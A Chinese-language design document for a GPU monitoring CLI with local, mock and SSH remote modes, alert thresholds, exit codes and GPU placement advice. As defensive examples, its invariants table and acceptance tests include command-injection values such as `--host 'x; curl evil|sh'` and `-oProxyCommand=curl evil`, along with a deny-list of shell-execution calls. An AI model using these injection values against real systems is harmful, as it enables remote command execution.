# 09 GPU 采集与管控设计（infra-gpu / T01-T03）

> **TL;DR**
> 1. **三模式同一条链路**：`local / mock / remote` 只负责产出**原始 CSV 文本**，之后全部走同一个纯函数 `parse_smi_csv → evaluate_alerts → build_plan → render`；mock 是"文本常量"，不是"特判分支"。
> 2. **mock golden（两卡）**：4090 24G 高负载（21600/24564=87.93%，util 88，74℃）+ 3090 24G 空闲（512/24576=2.08%，util 0，34℃）；默认阈值 90/85/90 **零告警 → exit 0**。
> 3. **告警三阈值**：显存占用率 90% / 温度 85℃ / 利用率 90%，一律 `>=` 触发，`0` = 关闭该项；**单次快照无去抖**，"持续"由外层连续采样 N 次判定（本工具不做）。
> 4. **退出码**：`0` 正常 / `1` 有告警 / `2` 采集失败 / `3` 参数错误（优先级 3 > 2 > 1 > 0）。
> 5. **分配建议**：`--need-gb` 输入估算显存，判据 `used + need <= total × 0.9`，输出建议表 + `recommended` 卡号；4090 当前仅剩 **507 MiB** 可分配。
> 6. **安全基线**：argv 列表 + `SMI_REMOTE_CMD` 常量 + host/user 白名单 + `--` 终结符，全文件零 `shell=True`。
> 7. **3 张变更单（G-01/02/03）**：mock 由 4 卡改 2 卡、退出码 2/3 语义对调、新增 `util` 告警与 `--util-warn`——三处均需回写 02/03，补丁命令已给出。

---

## 0. 与 02/03 的差异裁决（**先看这节，否则实现必踩坑**）

02 架构评审冻结了若干数值与语义，本文件按主管最新口径做了 3 处调整。**以本文件为准**，同时必须回写 02/03，否则 QA 按旧条文断言必然红。

| 变更单 | 02/03 原口径 | 本文件口径 | 理由 | 影响面 |
|---|---|---|---|---|
| **G-01** | `MOCK_SNAPSHOT` 为 **4 卡**常量（A100×2 + 4090×2），数值见 02·R2 | mock 为 **2 卡**（4090 高负载 + 3090 空闲），且改为**原始 CSV 文本常量** `MOCK_SMI_TEXT` / `MOCK_APPS_TEXT`，由 `collect_mock()` 现场解析 | 2 卡足够演示"满/空"对比；文本常量能证明"mock 走真解析器"，比冻结构造好的 dataclass 更强 | 03·T01 DoD 2/8 的数值与 alert 三元组 |
| **G-02** | 参数错误 → **2**，采集失败 → **3**（02·R13 / A-A5 / A-A9） | 采集失败 → **2**，参数错误 → **3** | 主管口径；本质是"2 = 环境问题、3 = 用法问题"（3 = 调用方写错了，类似 curl 的 3 = URL 格式错） | A-A5 / A-A9 / T02 DoD 5 / T03 DoD 1·6·8 |
| **G-03** | 告警只有 `vram` / `temp` 两类；阈值 90% / 80℃ | 新增第三类 `util`（利用率），温度默认 85℃；新增 `--util-warn`、`--need-gb` | 三阈值覆盖"卡被占满 / 卡过热 / 卡在跑"三类真实场景；分配建议需要独立入口 | A-A1 帮助项、JSON `alerts[].kind` 取值域 |

### 0.1 回写补丁（逐条可粘贴核对）

```bash
# G-01 替换 mock 断言（T01 DoD 2/8、A-A2/A-A4）
python src/gpu_snapshot.py --mock --json | python -c "import json,sys;d=json.load(sys.stdin);print(len(d['gpus']),len(d['alerts']))"   # 期望 2 0
python src/gpu_snapshot.py --mock --vram-warn 80 --temp-warn 70 --util-warn 80 --json \
  | python -c "import json,sys;print(sorted((a['gpu_index'],a['kind']) for a in json.load(sys.stdin)['alerts']))"  # 期望 [(0,'temp'),(0,'util'),(0,'vram')]

# G-02 退出码
python src/gpu_snapshot.py --mock --host x ; echo $?            # 期望 3（参数错误）
python src/gpu_snapshot.py --nvidia-smi /nonexistent/bin/nvidia-smi ; echo $?  # 期望 2（采集失败）

# G-03 第三阈值
python src/gpu_snapshot.py --help | grep -c -- "--util-warn"    # 期望 1
```

> 若主管最终选择保留 02 原口径（4 卡 / 2=usage），改动量极小：mock 换回 4 行文本、`EXIT_COLLECT` 与 `EXIT_USAGE` 两个常量互换即可——**全文件退出码只在这两个常量里出现**（见 §6 不变式 4）。

---

## 1. 统一数据模型（三模式共用，唯一真值）

### 1.1 dataclass（Python 3.9 兼容，禁 `X | Y`）

```python
@dataclass
class Proc:
    pid: Optional[int]; name: str; used_mb: Optional[float]

@dataclass
class Gpu:
    index: int; name: str; uuid: Optional[str]
    vram_total_mb: Optional[float]; vram_used_mb: Optional[float]; vram_free_mb: Optional[float]
    util_percent: Optional[float];  temp_c: Optional[float]
    power_draw_w: Optional[float];  power_limit_w: Optional[float]
    processes: List[Proc] = field(default_factory=list)
    alerts: List[Alert] = field(default_factory=list)   # 与顶层 alerts 双写，便于逐卡消费

@dataclass
class Alert:
    gpu_index: int
    kind: str            # "vram" | "temp" | "util"（闭集，渲染层按此分发图标）
    value: float
    threshold: float
    message: str

@dataclass
class Thresholds:        # 阈值随快照走，渲染层不再回头读 argparse
    vram_warn: float; temp_warn: float; util_warn: float

@dataclass
class Snapshot:
    schema_version: int          # 恒 1
    mode: str                    # "local" | "remote" | "mock"
    host: str                    # local/mock 时为 "localhost"
    collected_at: str            # "%Y%m%d-%H%M%S"（同一常量，落盘名复用）
    nvidia_smi: Optional[str]
    driver_version: Optional[str]
    gpus: List[Gpu]
    alerts: List[Alert]
    warnings: List[str]
    thresholds: Thresholds
    placement: Optional[Dict[str, object]]   # --need-gb 缺省时 None
```

**为什么要 `Thresholds` 进快照**：否则渲染层和 JSON 层各自去读 `args.vram_warn`，"我看到的阈值"和"判定用的阈值"可能不是同一个数——这正是 02 反复强调的"双真值"病的变种。

### 1.2 JSON 顶层键（冻结，只增不减）

```
schema_version, mode, host, collected_at, nvidia_smi, driver_version,
thresholds{vram_warn,temp_warn,util_warn}, gpus[], alerts[], warnings[], placement
```

- `gpus[]` 每项：`index,name,uuid,vram_total_mb,vram_used_mb,vram_free_mb,util_percent,temp_c,power_draw_w,power_limit_w,processes[],alerts[]`。
- `None` 一律输出 `null`，**不吞键**（`n/a` 只出现在 markdown，JSON 里是 `null`）。
- 键名清单同时写在模块 docstring 顶部（T01 DoD 1）。

### 1.3 三模式的字段填充差异

| 字段 | local | mock | remote |
|---|---|---|---|
| `mode` | `"local"` | `"mock"` | `"remote"` |
| `host` | `localhost` | `localhost` | `--host` 原值（白名单校验后） |
| `nvidia_smi` | 解析出的绝对路径 | `"<mock>"` | `"nvidia-smi"`（远端 PATH 解析，不探测绝对路径） |
| `driver_version` | 真实值 | `550.54.14`（写在 CSV 里） | 真实值；取不到→`None` |
| 其余 | 全部来自同一次 CSV 解析 | 同左 | 同左 |

---

## 2. 采集三模式

### 2.1 唯一分发点

```python
def collect(args) -> Snapshot:
    if args.mock:                     # 唯一一处 mock 分支（不变式 2）
        return collect_mock()
    if args.host:
        return collect_remote(args.host, args.ssh_user, args.ssh_port, args.ssh_key)
    return collect_local(resolve_nvidia_smi(args.nvidia_smi))
```

三个 `collect_*` 的唯一产出是 `(csv_text, apps_text, driver_hint)`，随后统一 `parse_smi_csv → parse_compute_apps → evaluate_alerts`。**采集层不得自己算百分比、自己判阈值。**

### 2.2 本机模式（`--nvidia-smi` 可配置）

```python
def resolve_nvidia_smi(cli_path: Optional[str]) -> str:
    # 优先级固定三层，任一命中即返回；全 miss → CollectError（exit 2）+ 三条建议
    for cand in (cli_path, os.environ.get("NVIDIA_SMI_PATH")):
        if cand:
            if Path(cand).is_file():
                return str(Path(cand))
            raise CollectError(f"nvidia-smi 不可用：{cand} 不存在或不是文件",
                               hints=HINTS_NO_SMI)     # 显式给错路径 → 立即失败，不静默回落
    found = shutil.which("nvidia-smi")
    if found:
        return found
    raise CollectError("未找到 nvidia-smi", hints=HINTS_NO_SMI)
```

`HINTS_NO_SMI`（文案原文，A-A9 断言用）：

1. 安装 NVIDIA 驱动（`nvidia-smi` 随驱动提供），装完执行 `nvidia-smi -L` 自检；
2. 设置环境变量 `NVIDIA_SMI_PATH=/usr/bin/nvidia-smi`，或用 `--nvidia-smi <path>` 显式指定；
3. 本机无卡时改用 `--host <主机>` 采集远端，或用 `--mock` 演示。

采集调用（两次，独立失败）：

```python
def run_cmd(argv: List[str], timeout: int) -> subprocess.CompletedProcess:
    return subprocess.run(argv, capture_output=True, text=True,
                          encoding="utf-8", errors="replace",
                          timeout=timeout, check=False)          # 无 shell=True，无 check
```

- 主查询失败 → `CollectError(rc + stderr 摘要)`；
- 进程查询失败 / 空 → 主表照常，`warnings += "进程表不可用（…），进程列留空"`（L3）。

### 2.3 mock 模式（**文本常量，不是分支**）

`MOCK_SMI_TEXT` 与真实 CSV **逐字节同构**（`--format=csv,noheader,nounits` 的实际输出形态，逗号后带空格），因此它必须经过与线上完全相同的解析路径：

```python
# 期望 11 字段：index,uuid,name,driver_version,memory.total,memory.used,memory.free,
#              utilization.gpu,temperature.gpu,power.draw,power.limit
MOCK_SMI_TEXT = """\
0, GPU-4f2a1c9e-mock-0001, NVIDIA GeForce RTX 4090, 550.54.14, 24564, 21600, 2964, 88, 74, 320.42, 450.00
1, GPU-7b3d5e8a-mock-0002, NVIDIA GeForce RTX 3090, 550.54.14, 24576, 512, 24064, 0, 34, 68.15, 350.00
"""

MOCK_APPS_TEXT = """\
GPU-4f2a1c9e-mock-0001, 24817, /usr/bin/python3, 11200
GPU-4f2a1c9e-mock-0001, 24903, /usr/bin/python3, 10300
"""
```

golden 数值表（QA 固定断言，改动即视为破坏契约）：

| idx | name | total | used | free | used% | util | temp | 定位 |
|---|---|---|---|---|---|---|---|---|
| 0 | NVIDIA GeForce RTX 4090 | 24564 | 21600 | 2964 | **87.93%** | 88 | 74 | 高负载（<90% → 默认不告警） |
| 1 | NVIDIA GeForce RTX 3090 | 24576 | 512 | 24064 | **2.08%** | 0 | 34 | 空闲 |

设计约束（这三条决定了 mock 能不能长期稳定）：

1. **默认阈值零告警**：87.93 < 90、88 < 90、74 < 85、34 < 85 → `alerts == []`，`--mock` 退 0（A-A2），不与 A-A6 冲突（02·R2 的原始矛盾就此消解）。
2. **严苛阈值恰好 3 条**，全部落在卡 0：`(0,"vram",87.93,80)`、`(0,"util",88,80)`、`(0,"temp",74,70)`——一个都不多，`len(alerts) == 3` 可直接断言。
3. **进程和显存自洽**：`11200 + 10300 = 21500`，与 `used 21600` 差 100 MiB（CUDA context），二者不矛盾；卡 1 无进程（空闲卡本就该没有行）。

> 卡 1 故意给 24576 而非 24564：真实的 3090 与 4090 显存口径不同，顺带验证解析器**不假设所有同规格卡数值相同**。

### 2.4 远程模式（`--host`）

```python
SMI_REMOTE_CMD = (
    "nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total,memory.used,"
    "memory.free,utilization.gpu,temperature.gpu,power.draw,power.limit "
    "--format=csv,noheader,nounits"
)   # 模块级字面量：全文件只允许出现 2 次（定义 1 次 + 引用 1 次），永不 f-string 插值
```

```python
_HOST_RE = re.compile(r"[A-Za-z0-9._-]{1,253}")

def validate_target(value: str, what: str) -> str:
    if value.startswith("-"):                     # --host "-oProxyCommand=..." 当选项执行 = RCE
        raise UsageError(f"{what} 不能以 '-' 开头：{value!r}")
    if not _HOST_RE.fullmatch(value):
        raise UsageError(f"{what} 含非法字符（仅允许 A-Z a-z 0-9 . _ -）：{value!r}\n"
                         f"多主机/跳板机请用 ~/.ssh/config 的 ProxyJump，见 README")
    return value
```

```python
def build_ssh_argv(host, user, port, key, remote_cmd) -> List[str]:
    dest = f"{user}@{host}" if user else host      # 两段都已过白名单，故此处拼接安全
    argv = ["ssh",
            "-o", "BatchMode=yes",                 # 禁交互，CI 不挂死
            "-o", "ConnectTimeout=8",
            "-o", "StrictHostKeyChecking=accept-new",
            "-o", "LogLevel=ERROR",
            "-p", str(int(port))]
    if key:
        argv += ["-i", key]                        # 只当路径传，不读内容、不打印
    argv += ["--", dest, remote_cmd]               # '--' = 选项终结符，第二道闸
    return argv
```

五条硬约束（与 02·S1~S10 一致，落在本文件即生效）：

| # | 约束 | 落地方式 |
|---|---|---|
| S1 | 禁 `shell=True` / `os.system` / `os.popen` / `getoutput` / 整串命令 | 只调 `subprocess.run(list)`；卡点 grep 见 §6 |
| S2 | 每项独立 list 元素 | `build_ssh_argv` 返回 `List[str]`，无一处 `" ".join` |
| S3 | 远端命令是常量，用户输入永不进入 | `SMI_REMOTE_CMD` 无插值；`host/user` 只进 `dest` 与 `--` 之后 |
| S4/S5 | `re.fullmatch` 白名单 + 拒 `-` 开头 + `--` | `validate_target()`；`"a,b"`、含空格、含 `$(` 一律 `UsageError`(exit 3) |
| S6/S7/S9 | `timeout=15`、stderr 截 20 行并剥 ANSI/控制字符、错误含 `rc + host` | `run_cmd` 抛 `CollectError(f"远端采集失败 rc={rc} host={host}\n{tail}")` |

`host` 含逗号/空格 → 直接 `UsageError`，文案指向 README 的 `ProxyJump`（Q3：不做跳板机、不做多主机循环）。

---

## 3. 字段清单与解析容错

### 3.1 字段表（`--format=csv,noheader,nounits`）

| 序 | `--query-gpu` 字段 | 落点 | 必需 | 缺失/异常时 |
|---|---|---|---|---|
| 0 | `index` | `Gpu.index` | ✅ | 不可解析 → 该行跳过（没有卡号的卡无法定位） |
| 1 | `uuid` | `Gpu.uuid` | ✅ | `None` → 进程按出现顺序退回 index 匹配 |
| 2 | `name` | `Gpu.name` | ✅ | `""` → `"unknown"`，**不跳过** |
| 3 | `driver_version` | `Snapshot.driver_version` | 可选 | 取首行，`None` 则整列 `null` |
| 4 | `memory.total` | `vram_total_mb` | ✅ | `None` → 该卡不参与分配、不产 vram 告警 |
| 5 | `memory.used` | `vram_used_mb` | ✅ | 同上 |
| 6 | `memory.free` | `vram_free_mb` | 可选 | `None` → 由 `total-used` 补算（补算要在 warnings 留痕） |
| 7 | `utilization.gpu` | `util_percent` | ✅ | `None` → 不产 util 告警 |
| 8 | `temperature.gpu` | `temp_c` | 可选 | 虚拟化常见缺失 → `None`，不产 temp 告警 |
| 9 | `power.draw` | `power_draw_w` | 可选 | `[N/A]` 常态，直接 `None` |
| 10 | `power.limit` | `power_limit_w` | 可选 | 同上 |

进程查询独立一次：`--query-compute-apps=gpu_uuid,pid,process_name,used_gpu_memory`，字段序 `uuid, pid, name, used_mb`。

### 3.2 `parse_float(raw) -> Optional[float]`

规则（顺序执行，**任何一步失败都返回 `None`，绝不返回 0**）：

1. `raw.strip()` 后为空 → `None`；
2. 命中哨兵词（大小写不敏感，含方括号包裹形式）→ `None`：`N/A`、`[N/A]`、`[Not Supported]`、`Not Supported`、`Unknown`、`[Unknown Error]`；
3. 剥单位后再转数字，正则 `^([+-]?\d+(?:\.\d+)?)\s*(mib|mb|gib|gb|%|c|w|mhz)?$`（单位大小写不敏感）；
4. 数字段仍不匹配 → `None`。

单位换算（**唯一入口，别处不许再乘**）：

| 后缀 | 处理 | 备注 |
|---|---|---|
| 无 | 按字段本位解释 | `nounits` 生效时的主路径 |
| `MiB` | ×1 | 内存类字段本位 = MiB |
| `GiB` | ×1024 | 罕见但合法 |
| `MB` / `GB` | ×1 / ×1024，并 `warnings += "字段 X 使用十进制单位 MB/GB，按 MiB 解释（偏高 ≤4.8%）"` | 10^6 vs 2^20 的差异，保守方向可接受 |
| `%` / `C` / `W` | 丢弃单位 | 数值即本位 |

覆盖测试（T01 DoD 3）：`"N/A"→None`、`"[N/A]"→None`、`"Not Supported"→None`、`"55 C"→55.0`、`"12.34 W"→12.34`、`" 72100 "→72100.0`、`"24564 MiB"→24564.0`、`""→None`。

### 3.3 `split_row(line, fields) -> Optional[List[str]]`

字段数漂移是不变量级的坑（GPU 名含逗号、旧驱动少一列），规则按**字段名定位**而不是写死下标：

```
名位 name_pos = fields.index("name")            # 当前为 2，但降级到最小集时仍成立
尾部定长 = len(fields) - name_pos - 1
若 len(parts) > len(fields)：把 parts[name_pos : len(parts)-尾部定长] 用 "," 合并回 name  ← 多余段归名
若 len(parts) < len(fields)：返回 None（该行跳过 + warnings），不整体失败
```

例：`0, GPU-x, NVIDIA A100-SXM4-80GB, 81920, 2048, 0, 38` 在 11 字段集下少 4 列 → 跳过该行；在最小集 6 字段下正常解析。**一块坏卡不许让整张报表挂掉。**

### 3.4 容错阶梯（全链路不裸崩）

| 级 | 触发 | 处理 | 后果 |
|---|---|---|---|
| L0 | 正常 | 全字段解析 | `warnings=[]` |
| L1 | `rc!=0` 且 stderr 命中 `Field "(\w+\.\w+)" is not a valid field` | 从字段表剔除该字段、对应列填 `None`，**最多重试 2 次** | `warnings += "驱动不支持字段 X，已降级"` |
| L2 | 重试后仍失败 | 降级到最小集 `index,name,memory.total,memory.used`，其余 `None`，放弃进程表 | `warnings += "已降级到最小字段集"` |
| L3 | stdout 为空 / `No devices found` | `CollectError` → **exit 2** | 采集失败 |
| L3' | `No running processes found` | 空进程表 + 一条 warning，**不抛** | 正常出表 |
| L4 | 单行字段数不符 | 见 §3.3 | 跳过该行 |
| L5 | 值不可解析 | `None` → markdown `n/a`，JSON `null` | 不写 0（0 会污染利用率/分配判断） |
| L6 | 编码/换行 | `errors="replace"`、`\r` 统一 strip、行内 `strip()` 后 split | 不因 BOM/CRLF 崩 |

### 3.5 数值合理性守卫（防"脏数据看起来很正常"）

| 检查 | 处理 |
|---|---|
| `util_percent` 不在 `[0,100]` | 截断到边界 + warning（驱动偶发报 101） |
| `temp_c` 不在 `[-40,150]` | 置 `None` + warning（`0` 常见于传感器不可读） |
| `vram_used_mb > vram_total_mb` | 保留原值 + warning；计算占用率时 clamp 到 100（不因 103% 把分配逻辑算成负余量） |
| `vram_free_mb` 与 `total-used` 偏差 > 5% | 以 `total-used` 为准 + warning（驱动 free 口径含 reserved） |

---

## 4. 告警与退出码

### 4.1 阈值常量（**唯一出处**）

```python
DEFAULTS = {
    "vram_warn": 90.0,   # %，显存占用率上限
    "temp_warn": 85.0,   # ℃，温度上限
    "util_warn": 90.0,   # %，利用率上限（"这张卡正在忙"）
}
WATERMARK = 0.9          # 分配安全水位，见 §5
SENTINEL_OFF = 0.0       # 任一阈值传 0 = 关闭该项
```

argparse 默认值一律写 `default=DEFAULTS["vram_warn"]`，**不许再抄一遍数字**；抓到的阈值装进 `Snapshot.thresholds`，渲染/JSON 全部从快照读。

### 4.2 判定规则

```python
def evaluate_alerts(gpus, th) -> List[Alert]:
    out = []
    for g in gpus:
        if th.vram_warn > 0 and g.vram_total_mb and g.vram_used_mb is not None:
            pct = min(g.vram_used_mb / g.vram_total_mb * 100.0, 100.0)
            if pct >= th.vram_warn:
                out.append(Alert(g.index, "vram", round(pct, 2), th.vram_warn, ...))
        if th.temp_warn > 0 and g.temp_c is not None and g.temp_c >= th.temp_warn:
            out.append(Alert(g.index, "temp", g.temp_c, th.temp_warn, ...))
        if th.util_warn > 0 and g.util_percent is not None and g.util_percent >= th.util_warn:
            out.append(Alert(g.index, "util", g.util_percent, th.util_warn, ...))
    return out
```

- 语义：**`>=` 触发**（边界值取"更危险"一侧）；`threshold == 0` 由调用方短路，函数内用 `> 0` 表达"该项启用"。
- `vram_total_mb` 为 `None`/`0` → 跳过 vram 判断（防除零 + 防假告警）；`temp_c`/`util_percent` 为 `None` → 跳过对应项。
- 每项独立成条，**不合并**（同一张卡可以同时 3 条）；`gpus[i].alerts` 与顶层 `alerts` 双写。
- 排序：`(gpu_index, kind)` 升序，保证断言稳定。
- 文案模板：`"GPU0 显存 87.93% ≥ 90%，仅剩 2964 MiB"`、`"GPU0 温度 74℃ ≥ 85℃"`、`"GPU0 利用率 88% ≥ 90%，卡上有 2 个进程"`。

### 4.3 "持续"怎么说清楚（**本工具不实现去抖**）

单次 `nvidia-smi` 就是**瞬时采样**，本工具是"快照"而非"监控系统"（02 已把趋势/历史列为 Out of Scope）。因此：

1. **不做**滑动窗口、不做 N 次连续命中、不做滞回（hysteresis）。理由：一旦把时间维度塞进单次 CLI，就得引入采样间隔/状态文件，成本远超收益，且会让 QA 的"一次命令一个结论"失效。
2. **"持续超阈"由外层循环判定**，给标准写法（README 收录）：

   ```bash
   # 每 30s 采一次，连续 3 次同一 (卡号, 类型) 命中才通知；反压靠 --json + jq
   for i in 1 2 3; do
     python src/gpu_snapshot.py --json | jq -r '.alerts[] | "\(.gpu_index) \(.kind)"'
     sleep 30
   done | sort | uniq -c | awk '$1>=3'
   ```

3. **采样间隔下限 5s**：`nvidia-smi` 单次 ~50ms，但高频轮询会与训练抢 PCIe/驱动锁；文档明确"建议 ≥5s"。
4. **温度抖动提示**：GPU 温度在负载切换时可 ±5℃，故 `--temp-warn` 建议比目标温度留 5℃ 缓冲（默认 85℃ 对应"目标 80℃ 报警"）。

### 4.4 退出码（**优先级 3 > 2 > 1 > 0**）

| code | 含义 | 典型触发 | 输出形态 |
|---|---|---|---|
| `0` | 采集成功且无告警 | `--mock`（默认阈值） | 正常 markdown / JSON |
| `1` | 采集成功但**有告警** | `--mock --vram-warn 1` | 报表照常打印（含告警段），只是退出码非 0 |
| `2` | **采集失败** | nvidia-smi 不存在、远端连不上、`No devices found`、超时 | stderr = 发生了什么 + 3 条建议；**无 traceback** |
| `3` | **参数错误** | `--mock --host x` 互斥、`--host "a b"`、`--port abc`、`--need-gb -1` | stderr = 用法错误 + `--help` 提示 |

- 只有 `main()` 调 `sys.exit`（全文件唯一出口），`UsageError`→3、`CollectError`→2，两者都走同一个 `render_error()`。
- 采集失败时**不输出半成品报表**（避免消费方把空表当"零告警"）：`2` 一律只有 stderr。
- 管道注意：`--mock | head` 的退出码取末端命令，与本节无关（A-A3）。

---

## 5. 任务分配建议

### 5.1 输入与触发

| 参数 | 类型 | 说明 |
|---|---|---|
| `--need-gb` | float > 0 | **待跑训练的估算显存（GiB）**，来源 = `vram_est.py --json` 的 `total_gb` |
| `--watermark` | float (0,1]，默认 `0.9` | 安全水位，单一常量 `WATERMARK` |

给了 `--need-gb` 才输出分配段（markdown 追加"分配建议"表，JSON 增加 `placement`）；不给则 `placement=null`，报表与之前完全一致。**互斥/校验**：`--need-gb <= 0` → `UsageError`(3)；`--watermark` 不在 `(0,1]` → `UsageError`(3)。

单位换算：`need_mb = need_gb * 1024`（GiB→MiB，唯一换算常量 `MIB_PER_GIB = 1024`，禁止散写）。

### 5.2 判据

```
avail_mb      = floor(vram_total_mb * WATERMARK) - vram_used_mb     # 该卡还能塞多少
fit           = need_mb <= avail_mb
after_used_pct= (vram_used_mb + need_mb) / vram_total_mb * 100
```

**默认 `--watermark 0.9`**（主管口径）：预留 10% 给激活峰值波动、CUDA context 增长与显存碎片，而不是"卡标称多少就能用多少"。

排除规则（命中即 `fit=False`，并写明原因，不静默丢弃）：

| reason | 条件 |
|---|---|
| `insufficient` | `need_mb > avail_mb` |
| `busy` | `util_percent >= util_warn`（且该项启用）——正在跑任务的卡不该被推荐 |
| `hot` | `temp_c >= temp_warn`（且该项启用） |
| `no_vram_info` | `vram_total_mb` 为 `None`（无法判断，宁可不用） |

### 5.3 排序与推荐

1. 可放卡（`fit=True`）按 `after_used_pct` **升序**（分配后负载最低优先）→ 再按 `index` 升序做稳定 tie-break；
2. `recommended = 排序后第一张`；无卡可放 → `"recommended": null` + 一条 `warnings`：`"无卡可容纳 X GiB（水位 0.9），建议降 batch/seq_len、换精度，或改 --watermark"`（指向 `vram_est.py` 重算）；
3. 不可放卡排在表尾，`verdict` 列写 `NO (reason)`，保留在表里供人看"差多少"。

### 5.4 输出样例（mock 快照 + `--need-gb 20`）

`avail`：卡 0 = `floor(24564×0.9)=22107 − 21600 = 507 MiB`；卡 1 = `floor(24576×0.9)=22118 − 512 = 21606 MiB`。

| 建议 | idx | name | 总显存 | 已用 | 可分配(水位0.9) | 本任务后占用 | 结论 |
|---|---|---|---|---|---|---|---|
| **#1** | 1 | NVIDIA GeForce RTX 3090 | 24576 | 512 | 21606 MiB | 85.4% | ✅ FIT |
| #2 | 0 | NVIDIA GeForce RTX 4090 | 24564 | 21600 | 507 MiB | 171.3% | ❌ NO (insufficient) |

JSON：

```json
"placement": {"need_gb": 20.0, "need_mb": 20480, "watermark": 0.9,
  "recommended": 1,
  "candidates": [
    {"index": 1, "name": "NVIDIA GeForce RTX 3090", "avail_mb": 21606, "after_used_pct": 85.42, "fit": true,  "reason": "fit"},
    {"index": 0, "name": "NVIDIA GeForce RTX 4090", "avail_mb": 507,   "after_used_pct": 171.31, "fit": false, "reason": "insufficient"}
  ]}
```

**教学用边界值**（写进 README，防止有人以为 87.93% 的卡"还能塞点"）：`--need-gb 0.5`（512 MiB）时卡 0 **仍不可放**（507 < 512）——这正是"安全水位吃掉的那 10%"在起作用（2456 MiB 被水位锁住）。

### 5.5 与 `vram_est.py` 串联

```bash
need=$(python src/vram_est.py --params 0.244 --hidden 768 --layers 12 --precision fp16 \
       --lora-rank 8 --batch-size 8 --seq-len 3000 --target-vram 24 --json | jq -r .total_gb)
python src/gpu_snapshot.py --json --need-gb "$need" | jq .placement.recommended
```

口径提醒（写进帮助文本）：`vram_est` 总量误差 ±30%，`WATERMARK 0.9` 只吸收约 10 个点，**`TIGHT` 结论不建议直接上机**；`vram_est` 判 `OOM` 时本工具仍会给出"能塞下"的卡，此时应以 `vram_est` 为准（分配建议只回答"哪张卡相对更空"，不回答"这配置能不能跑"）。

---

## 6. dev 必守不变式（4 条，可机械校验）

| # | 不变式 | 反面案例（会怎样烂掉） | 校验命令（期望输出） |
|---|---|---|---|
| **I1** | **解析与采集解耦为纯函数**：`parse_float` / `split_row` / `parse_smi_csv` / `parse_compute_apps` / `evaluate_alerts` / `render_*` / `to_json_dict` / `build_plan` 只吃 `str`/dataclass，函数内零 `print`/`open`/`subprocess`/`datetime.now`/全局可变状态 | 解析函数里顺手 `subprocess` 一次，QA 无卡环境立刻不可测（22 条验收全废） | `grep -nE "print\(|open\(|subprocess|datetime\.now|time\.time" src/gpu_snapshot.py` → 命中行必须全在 `collect_*` / `write_outputs` / `main` 段 |
| **I2** | **mock 不经任何 if 分支特判**：mock 只是"一段 CSV 文本"，走与真实完全相同的 `parse_smi_csv → evaluate_alerts → build_plan → render`；`if args.mock` 全文件**只允许 1 处**（`collect` 分发），解析/告警/分配/渲染层不得出现 `mode == "mock"` | 给 mock 直接塞构造好的 `Gpu` 对象，绕过解析器 → 解析器的 bug 在 mock 路径永不暴露，"无卡演示"变成"演示一个假系统" | `grep -c 'args\.mock' src/gpu_snapshot.py` → `1`；`grep -n 'mode *== *"mock"' src/gpu_snapshot.py` → 只允许出现在 `to_json_dict`/`render_markdown` 的元信息行 |
| **I3** | **SSH 参数永不进 shell 字符串**：全程 argv list、`SMI_REMOTE_CMD` 为字面常量且零插值、host/user 白名单 + `--` 终结符、禁 `shell=True`/`os.system`/`os.popen`/`getoutput` | 一处 `f"ssh {host} nvidia-smi"` 就是 RCE：`--host 'x; curl evil|sh'` | `grep -nE "shell\s*=\s*True|os\.system|os\.popen|getoutput" src/gpu_snapshot.py` → 空；`grep -c 'SMI_REMOTE_CMD' src/gpu_snapshot.py` → `2` |
| **I4** | **所有阈值单一出处**：`DEFAULTS` / `WATERMARK` / `MIB_PER_GIB` / `EXIT_*` / `FIELDS_*` 只在常量块定义一次；argparse 默认值、告警判定、渲染、help 文本、JSON 全部引用同一常量 | 帮助写 90、判定写 85、JSON 回显 80 → "我明明设了 90 为什么报 87" 这类工单永远修不完 | `grep -nE "\b(90|85)\b" src/gpu_snapshot.py` → 只命中常量块（`DEFAULTS` 定义行）+ docstring；`grep -c 'EXIT_' src/gpu_snapshot.py` ≥ 5 但 `2`/`3` 字面量不出现在 `sys.exit(` 参数里 |

验收联动：`I1`/`I4` 支撑 02·R5 的 AST 白名单扫描（`VIOLATION: none`），`I3` 支撑 T03 DoD 5，`I2` 支撑 G-01 的"mock 走真解析器"主张。

---

## 7. 可粘贴验收命令（本设计的自检清单）

```bash
# 1) 编译 + 依赖白名单（A-A8）
python -m py_compile src/gpu_snapshot.py

# 2) mock 三连：默认 0 告警退 0 / JSON 两卡 / 严苛阈值 3 告警退 1
python src/gpu_snapshot.py --mock; echo "exit=$?"                                   # 0
python src/gpu_snapshot.py --mock --json | python -c "import json,sys;d=json.load(sys.stdin);print(len(d['gpus']),d['mode'],[g['index'] for g in d['gpus']])"   # 2 mock [0, 1]
python src/gpu_snapshot.py --mock --vram-warn 80 --temp-warn 70 --util-warn 80 --json \
  | python -c "import json,sys;print([(a['gpu_index'],a['kind'],a['value'],a['threshold']) for a in json.load(sys.stdin)['alerts']])"
  # [(0, 'vram', 87.93, 80.0), (0, 'util', 88.0, 80.0), (0, 'temp', 74.0, 70.0)]
python src/gpu_snapshot.py --mock --vram-warn 1 --temp-warn 1; echo "exit=$?"         # 1

# 3) 纯函数直调（无卡、无网络；A-A10 第 2 条）
python -c "import sys;sys.path.insert(0,'src');from gpu_snapshot import parse_smi_csv as p,MOCK_SMI_TEXT as m;g=p(m,p.FIELDS_CORE);print(len(g),g[0].vram_total_mb,g[1].util_percent)"   # 2 24564.0 0.0

# 4) 解析容错
python -c "import sys;sys.path.insert(0,'src');from gpu_snapshot import parse_float as f;print([f(x) for x in ['N/A','[N/A]','Not Supported','55 C','12.34 W',' 72100 ','24564 MiB']])"
# [None, None, None, 55.0, 12.34, 72100.0, 24564.0]

# 5) 分配建议（§5.4 数字）
python src/gpu_snapshot.py --mock --json --need-gb 20 | python -c "import json,sys;p=json.load(sys.stdin)['placement'];print(p['recommended'],[(c['index'],c['avail_mb'],c['fit']) for c in p['candidates']])"
# 1 [(1, 21606, True), (0, 507, False)]
python src/gpu_snapshot.py --mock --json --need-gb 0.5 | python -c "import json,sys;print(json.load(sys.stdin)['placement']['recommended'])"   # 1（4090 差 5 MiB）

# 6) 退出码矩阵
python src/gpu_snapshot.py --mock --host x;                    echo "exit=$?"   # 3 互斥
python src/gpu_snapshot.py --nvidia-smi /nonexistent/x;         echo "exit=$?"   # 2 采集失败
python src/gpu_snapshot.py --host "-oProxyCommand=curl evil";   echo "exit=$?"   # 3 白名单
python src/gpu_snapshot.py --host "a b";                        echo "exit=$?"   # 3 含空格
python src/gpu_snapshot.py --need-gb -1;                        echo "exit=$?"   # 3

# 7) 落盘净化（K7）
